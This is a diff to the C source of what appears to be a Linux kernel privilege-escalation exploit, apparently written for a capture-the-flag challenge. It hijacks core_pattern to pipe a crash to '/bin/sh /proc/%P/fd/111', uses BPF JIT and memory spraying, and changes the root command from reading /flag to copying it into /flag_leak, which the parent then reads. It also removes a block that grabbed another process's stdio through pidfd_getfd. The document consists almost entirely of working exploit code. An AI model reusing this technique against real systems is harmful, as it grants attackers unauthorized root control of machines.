@@ -22,7 +22,7 @@
  *******************************/
 
 #define CORE_PATTERN_TARGET "|/bin/sh /proc/%P/fd/111"
-#define SHELL_CMD "cat /flag"
+#define SHELL_CMD "cat /flag > /flag_leak"
 
 #define BPF_JIT_SIZE 0x200
 // trigger vmalloc
@@ -86,9 +86,15 @@ void crash() {
   close(memfd);
   while (check_core() == 0)
     usleep(100000);
-  lstage("Root shell !!");
-  fputs(LINFO "flag: ", stdout);
-  *(sz *)0 = 0;
+  if (SYSCHK(fork()) == 0)
+    *(sz *)0 = 0;
+  wait(NULL);
+  int flag_fd = open("/flag_leak", O_RDONLY);
+  char flag_buf[0x100] = {};
+  SYSCHK(read(flag_fd, flag_buf, sizeof(flag_buf)));
+  linfo("flag: %s", flag_buf);
+
+  kbreak();
 }
 
 int main(int argc, char *argv[]) {
@@ -96,19 +102,6 @@ int main(int argc, char *argv[]) {
   void *keap_ptr;
   sz leak[BPF_PROG_SIZE / sizeof(sz)] = {0};
   char clear[BPF_PROG_SIZE] = {0};
-
-  if (argc > 1) {
-    int pid = strtoull(argv[1], 0, 10);
-    int pfd = syscall(SYS_pidfd_open, pid, 0);
-    int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
-    int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
-    int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
-    dup2(stdinfd, STDIN_FILENO);
-    dup2(stdoutfd, STDOUT_FILENO);
-    dup2(stderrfd, STDERR_FILENO);
-    CHK(system(SHELL_CMD) == EXIT_SUCCESS);
-    exit(EXIT_SUCCESS);
-  }
 
   lstage("INIT");
 
